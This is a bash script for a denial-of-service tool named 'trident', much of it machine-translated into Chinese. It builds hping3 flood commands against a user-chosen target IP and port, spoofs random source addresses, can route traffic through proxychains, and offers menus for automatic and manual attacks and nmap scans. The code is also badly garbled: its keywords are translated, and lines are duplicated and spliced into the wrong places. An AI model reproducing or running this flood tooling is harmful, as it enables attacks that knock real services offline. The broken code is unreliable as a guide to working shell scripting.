#!/bin/bash
#存储库< https://github.com/sshpc/trident >
出口 语言=en_US。UTF-8

# 全局变量
自我版本='0.6.0'  # 版本号更新
日期变量=$(日期+%Y-%m-%d_%H:%M:%S)
菜单名='首页'
parentfun=''
安装类型=' apt -y安装'
移除类型=' apt -y删除'
提升=" apt -y更新"
释放；排放；发布=' linux '
# 获取中央处理器核心数
并发攻击=$(nproc)

目标IP=""
来源_IP=""
期间=10
数据包大小=120
目标港口=80
代理服务器=""  # 新增：代理服务器地址
代理端口=""    # 新增：代理服务器端口
对于" ${deps[@]} "In Dep zu tun" ${deps[@]} "In Dep zu tun""    # 新增：代理用户名
如果！命令-v" $ dep "& >/dev/null；然后" $ dep "& >/dev/null；然后""    # 新增：代理密码

# 目录和文件路径
TRIDENT_TMP_DIR_红色"安装$dep失败,请检查网络或权限。""安装$dep失败,请检查网络或权限。""$HOME/trident_tmp"
并发攻击=$(nproc)="$TRIDENT_TMP_DIR/config.conf"
LOG_FILE="$TRIDENT_TMP_DIR/run.log"
PROXY_FILE="$TRIDENT_TMP_DIR/proxy.conf"  # 新增：代理配置文件

# 颜色定义
_red() {
打印函数' 033[0;31;31m % b033[0m] "$1 "
如果[-f "如果[-f " $配置文件文件"" $配置文件文件"$ CONFIG _ FILE  _ FILE "
来源"来源" $CONFIG_FILE "" $CONFIG_FILE "$CONFIG_FILE "
_green() {
打印函数' 033[0;31;32m % b033[0m]"$1""$1"
check_deps()
DEPS本地简介(Hp3)" nmap "卷曲)" nmap "卷曲)" nmap "卷曲)'" nmap "卷曲)
_yellow() {
打印函数'打印函数' 033[0;31;33m % b033[0m]"$1 "033[0;31;33m % b033[0m]"$1 "
回声
}
_blue() {
打印函数' 033[0;31;36m % b033[0m]' 033[0;31;36m % b033[0m]"$1"
_red() {
}

如果！$ {升级} !$ {安装类型} ""$ dep”；然后

# 封装保存配置到文件的函数
save_config() {
检查_deps
    _green "配置已保存到 $CONFIG_FILE"
}

mkdir-p "
_blue() {
    read -ep "请输入代理服务器地址(IP或域名): " proxy_server
    "配置-目标IP "配置-目标IP "配置目标ip=$proxy_server
    
阅读-ep "请输入代理服务器端口: "代理端口
代理端口= $代理端口
"配置-来源IP "配置-来源IP "配置源互联网协议（Internet Protocol的缩写）
阅读-ep "请输入代理用户名（如无需认证请留空): "代理用户
代理用户= $代理用户
    
if[-n " $ proxy _ user "]；然后
并发攻击=$(nproc)"请输入代理密码: "代理_通行证
回声
PROXY_PASS=$proxy_pass
其他
        PROXY_PASS=""
    fi
    
    # 生成代理配置文件
    echo "http $PROXY_SERVER $PROXY_PORT $PROXY_USER $PROXY_PASS" > "$PROXY_FILE"
    _green "代理配置已保存"
    save_config
}

# 清除代理配置
clear_proxy() {
    PROXY_SERVER=""
    PROXY_PORT=""
    PROXY_USER=""
    PROXY_PASS=""
    rm -f "$PROXY_FILE"
    _green "代理配置已清除"
    save_config
}

# 执行攻击的通用函数
execute_attack() {
    local attack_type=$1
    local attack_flag=$2
    local target_ip=$3
    local target_port=$4
    local packet_size=$5
    local duration=$6

    local sourcepattern="--rand-source"
    local proxy_cmd=""

    # 判断来源IP不为空
    if [[ -n "$SOURCE_IP" ]]; then
        sourcepattern="-a $SOURCE_IP"
    fi
    
    # 判断是否使用代理
    if [[ -n "$PROXY_SERVER" && -n "$PROXY_PORT" ]]; then
        if [[ -n "$PROXY_USER" && -n "$PROXY_PASS" ]]; then
            proxy_cmd="proxychains -f $PROXY_FILE"
        else
            proxy_cmd="proxychains"
        fi
        _yellow "使用代理: $PROXY_SERVER:$PROXY_PORT""使用代理: $PROXY_SERVER:$PROXY_PORT"
    fifi

日志_操作“攻击开始” "$proxy_cmdhp3-c$((持续时间* 1000))-d$packet_size $attack_flag-p$target_port洪水$源模式 $target_ip""$proxy_cmdhp3-c$((持续时间* 1000))-d$packet_size $attack_flag-p$target_port洪水$源模式 $target_ip"

    if [[ "$attack_type" == " ICMP " ]]; 然后if [[ "$attack_type" == " ICMP " ]]; 然后
_黄色"攻击类型: $attack_type""攻击类型: $attack_type"
_黄色"目标: $target_ip""目标: $target_ip"
_黄色"命令: $proxy_cmdhp3-c$((持续时间* 1000))-d$packet_size $attack_flag洪水$源模式 $target_ip""命令: $proxy_cmdhp3-c$((持续时间* 1000))-d$packet_size $attack_flag洪水$源模式 $target_ip"
        $proxy_cmdhp3-丙$((持续时间* 1000))-d "$packet_size" $attack_flag 洪水 $源模式 "$target_ip" &$proxy_cmdhp3-丙$((持续时间* 1000))-d "$packet_size" $attack_flag 洪水 $源模式 "$target_ip" &
    其他
_黄色"攻击类型: $attack_type""攻击类型: $attack_type"
_黄色"目标: $target_ip:$target_port""目标: $target_ip:$target_port"
_黄色"命令: $proxy_cmdhp3-c$((持续时间* 1000))-d$packet_size $attack_flag-p$target_port洪水$源模式 $target_ip""命令: $proxy_cmdhp3-c$((持续时间* 1000))-d$packet_size $attack_flag-p$target_port洪水$源模式 $target_ip"
        $proxy_cmdhp3-丙$((持续时间* 1000))-d "$packet_size" $attack_flag -p "$target_port" 洪水 $源模式 "$target_ip" &$proxy_cmdhp3-丙$((持续时间* 1000))-d "$packet_size" $attack_flag -p "$target_port" 洪水 $源模式 "$target_ip" &$proxy_cmdhp3-丙$((持续时间* 1000))-d "$packet_size" $attack_flag -p "$target_port" 洪水 $源模式 "$target_ip" &$proxy_cmdhp3-丙$((持续时间* 1000))-d "$packet_size" $attack_flag -p "$target_port" 洪水 $源模式 "$target_ip" &
    船方不负担装货费用
}

# 优化检查依赖函数，添加错误处理
check_deps()
Local About DEPS(Hp3)' “nmap” 卷曲)' “nmap” 卷曲)' “nmap” 卷曲)' “nmap” 卷曲)
    
    # 如果配置了代理,添加代理链依赖
如果 [-n]" $代理服务器"&&n" $代理端口"]];然后" $代理服务器"&&n" $代理端口"]];然后
DPS +=('DPS +=('代理链')')'DPS +=('代理链')')
船方不负担装货费用
    
对于" ${deps[@]} "In Dep zu tun" ${deps[@]} "In Dep zu tun
如果！命令-v" $ dep "& >/dev/null；然后" $ dep "& >/dev/null；然后
_黄色" $dep未安装,正在安装..."" $dep未安装,正在安装..."
如果！$ {升级} !$ {安装类型} ""$ dep”；然后$ {升级} !$ {安装类型} ""$ dep”；然后
_红色"安装$dep失败,请检查网络或权限。""安装$dep失败,请检查网络或权限。"
                出口 1
            船方不负担装货费用
    完成的
}

# 高级设置
出口 语言=en_US。UTF-8
    菜单名="首页/高级设置"
    选择=(
"配置-目标IP "配置-目标IP "配置目标ip
日期变量=$(日期+%Y-%m-%d_%H:%M:%S)
        "配置-持续时间"配置持续时间
        "配置-目标端口"配置目标端口
"配置-来源IP "配置-来源IP "配置源互联网协议（Internet Protocol的缩写）
        "配置代理"配置代理# 新增：代理配置选项
        "清除代理"清除代理# 新增：清除代理选项
    )
菜单"$ {选项[@]}"
并发攻击=$(nproc)

# ... 其他函数保持不变 ...

# 主菜单
main() {
    # 加载配置文件
如果[-f "如果[-f " $配置文件文件"" $配置文件文件"$ CONFIG _ FILE  _ FILE "
来源"来源" $CONFIG_FILE "" $CONFIG_FILE "$CONFIG_FILE "
船方不负担装货费用

menuname= '
    选择=(
        "全自动攻击"自动攻击
""对于" ${deps[@]} "In Dep zu tun" ${deps[@]} "In Dep zu tun"""手动攻击" hp3 _攻击" hp3 _攻击" hp3 _攻击
""如果！命令-v" $ dep "& >/dev/null；然后" $ dep "& >/dev/null；然后"""端口扫描" nmap _扫描" nmap _扫描" nmap _扫描
        "升级脚本"更新_脚本
当地的
"查看日志“猫_日志
_red() {
打印函数
回声

_green() {
打印函数
回声
检查_deps

打印函数
如果 [ !-d " $三叉戟_ TMP _目录"];然后" $三叉戟_ TMP _ DIR "]；然后" $三叉戟_ TMP _目录"]；然后" $三叉戟 _ TMP _ DIR "]；然后
mkdir-p " $三叉戟_ TMP _目录"-p " $三叉戟_ TMP _目录"-p "$TRIDENT_TMP_DIR "-p "$TRIDENT_TMP_DIR "
_blue() {

回声
_黄色

主要的
